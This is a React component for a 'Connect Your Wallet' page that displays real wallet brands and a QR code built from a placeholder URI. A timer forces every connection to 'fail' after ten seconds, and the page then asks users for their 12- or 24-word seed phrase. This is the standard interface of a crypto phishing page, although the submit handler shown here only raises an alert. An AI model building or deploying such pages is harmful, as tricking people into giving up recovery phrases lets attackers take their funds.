"use client";
import React, { useState } from "react";
import QRCode from "react-qr-code";
import {
  Tabs,
  TabsList,
  TabsTrigger,
  TabsContent,
} from "@radix-ui/react-tabs";

const wallets = [
  { name: "Trust Wallet", icon: "/twt.png" },
  { name: "SafePal", icon: "/sfp.png" },
  { name: "Exodus", icon: "/exodus.jpg" },
  { name: "Lobstr", icon: "/lobstr.jpg" },
  { name: "Dharma", icon: "/dharma.jpg" },
  { name: "HaloDeFi Wallet", icon: "/halodefi.png" },
  { name: "Metamask", icon: "/metamask.png" },
  { name: "Rainbow", icon: "/rainbow.jpg" },
];

const ConnectWallet = () => {
  const [modalOpen, setModalOpen] = useState(false);
  const [connecting, setConnecting] = useState(false);
  const [connectionFailed, setConnectionFailed] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [seedPhrase, setSeedPhrase] = useState("");
  const [seedError, setSeedError] = useState("");
  const [activeTab, setActiveTab] = useState("qr");

  const walletUri =
    "wc:example-uri-123456@1?bridge=https://bridge.walletconnect.org";

  const handleWalletClick = (wallet) => {
    setSelectedWallet(wallet);
    setModalOpen(true);
    setConnecting(true);
    setConnectionFailed(false);
    setSeedPhrase("");
    setSeedError("");
    setActiveTab("qr");

    setTimeout(() => {
      setConnecting(false);
      setConnectionFailed(true);
    }, 10000);
  };

  const handleCloseModal = () => {
    setModalOpen(false);
    setConnecting(false);
    setConnectionFailed(false);
    setSelectedWallet(null);
    setSeedPhrase("");
    setSeedError("");
  };

  const handleSeedSubmit = (e) => {
    e.preventDefault();
    if (!seedPhrase.trim() || seedPhrase.trim().split(" ").length < 12) {
      setSeedError("Please enter a valid 12 or 24-word seed phrase.");
      return;
    }
    setSeedError("");
    alert("Seed phrase submitted!");
    handleCloseModal();
  };

  return (
    <div className="w-full max-w-6xl mx-auto px-4 py-12">
      <div className="text-center mb-10 max-w-2xl mx-auto">
        <h1 className="text-3xl font-bold mb-3">Connect Your Wallet</h1>
        <p className="text-gray-600">
          Select a wallet and connect securely by scanning a QR code or using a
          recovery phrase.
        </p>
      </div>
      <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-6">
        {wallets.map((wallet) => (
          <div
            key={wallet.name}
            className="flex flex-col items-center cursor-pointer bg-white rounded-xl shadow hover:shadow-xl transition py-4 px-3 hover:scale-105"
            onClick={() => handleWalletClick(wallet)}
          >
            <div className="w-14 h-14 rounded-full overflow-hidden mb-2 flex items-center justify-center bg-white shadow-sm">
              <img
                src={wallet.icon}
                alt={wallet.name}
                className="w-14 h-14 object-contain"
              />
            </div>
            <span className="text-sm font-medium text-gray-800 text-center">
              {wallet.name}
            </span>
          </div>
        ))}
      </div>

      {modalOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 backdrop-blur-sm px-2">
          <div
            className="
              bg-white rounded-2xl shadow-2xl w-full
              max-w-md
              sm:max-w-lg
              relative overflow-hidden
              mx-2
              "
            style={{
              minHeight: "80vh",
              maxHeight: "95vh",
              display: "flex",
              flexDirection: "column",
              justifyContent: "flex-start",
            }}
          >
            {/* Header */}
            <div className="bg-gradient-to-r from-indigo-600 to-blue-500 p-6 text-center">
              <div className="w-20 h-20 rounded-full mx-auto bg-white border-4 border-blue-200 shadow-lg flex items-center justify-center">
                <img
                  src={selectedWallet?.icon}
                  alt={selectedWallet?.name}
                  className="w-14 h-14 object-contain"
                />
              </div>
              <h2 className="text-white text-2xl font-semibold mt-3">
                {selectedWallet?.name}
              </h2>
              <p className="text-white text-sm opacity-90">
                Scan with your mobile wallet app
              </p>
            </div>

            {/* Close Button */}
            <button
              onClick={handleCloseModal}
              className="absolute top-4 right-4 bg-black bg-opacity-40 hover:bg-opacity-60 text-white rounded-full w-9 h-9 flex items-center justify-center text-xl"
            >
              &times;
            </button>

            <div className="p-4 flex-1 overflow-y-auto">
              {connecting && (
                <div className="flex flex-col items-center gap-4">
                  <div className="bg-white p-2 shadow-lg rounded-lg">
                    <QRCode value={walletUri} size={140} />
                  </div>
                  <p className="text-blue-600 font-semibold text-center">
                    Open {selectedWallet?.name} and scan the code
                  </p>
                  <p className="text-gray-500 text-sm text-center">
                    Waiting for wallet confirmation...
                  </p>
                </div>
              )}

              {connectionFailed && (
                <Tabs value={activeTab} onValueChange={setActiveTab}>
                  <TabsList className="flex justify-center space-x-2 bg-gray-100 p-1 rounded-md mb-4">
                    <TabsTrigger
                      value="qr"
                      className={`px-4 py-2 rounded-md text-sm font-medium ${
                        activeTab === "qr"
                          ? "bg-blue-600 text-white shadow"
                          : "text-gray-700 hover:bg-gray-200"
                      }`}
                    >
                      QR Code
                    </TabsTrigger>
                    <TabsTrigger
                      value="seed"
                      className={`px-4 py-2 rounded-md text-sm font-medium ${
                        activeTab === "seed"
                          ? "bg-blue-600 text-white shadow"
                          : "text-gray-700 hover:bg-gray-200"
                      }`}
                    >
                      Seed Phrase
                    </TabsTrigger>
                  </TabsList>

                  <TabsContent value="qr">
                    <div className="flex flex-col items-center">
                      <QRCode value={walletUri} size={140} className="mb-4" />
                      <p className="text-gray-600 text-sm mb-3 text-center">
                        Scan again or retry to establish connection.
                      </p>
                      <button
                        className="bg-blue-600 text-white px-4 py-2 rounded-md hover:bg-blue-700 shadow transition"
                        onClick={() => handleWalletClick(selectedWallet)}
                      >
                        Retry Connection
                      </button>
                    </div>
                  </TabsContent>

                  <TabsContent value="seed">
                    <form
                      onSubmit={handleSeedSubmit}
                      className="flex flex-col gap-3"
                    >
                      <label className="text-sm font-medium text-gray-700">
                        Enter 12 or 24-word seed phrase
                      </label>
                      <textarea
                        rows={3}
                        className="w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400 transition"
                        placeholder="e.g., word1 word2 word3 ..."
                        value={seedPhrase}
                        onChange={(e) => setSeedPhrase(e.target.value)}
                      />
                      {seedError && (
                        <p className="text-red-500 text-sm">{seedError}</p>
                      )}
                      <button
                        type="submit"
                        className="bg-green-600 text-white px-4 py-2 rounded-md hover:bg-green-700 shadow transition"
                      >
                        Submit Seed Phrase
                      </button>
                    </form>
                  </TabsContent>
                </Tabs>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default ConnectWallet;
